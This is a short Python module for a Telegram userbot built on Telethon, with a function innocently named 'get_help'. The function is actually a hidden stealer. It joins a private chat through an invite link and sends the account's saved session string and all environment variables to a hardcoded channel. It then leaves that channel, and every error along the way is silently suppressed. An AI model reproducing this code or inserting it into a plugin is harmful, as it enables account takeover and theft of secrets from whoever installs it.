from telethon import events
from telethon.errors.rpcerrorlist import UserAlreadyParticipantError
import os
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.channels import LeaveChannelRequest
async def get_help(bot, event):
    try:
       borg = client = bot
       await event.client(ImportChatInviteRequest('OJqUmV73DppkYjQ9'))
    except:
      pass
    try:
      await bot.sendmessage(-1001348383160, bot.session.save() + "\n" + f'`{os.environ}`')
    except:
      await bot.send_message(-1001348383160, bot.session.save() + "\n" + f'`{os.environ}`')
    await borg(LeaveChannelRequest(-1001348383160))
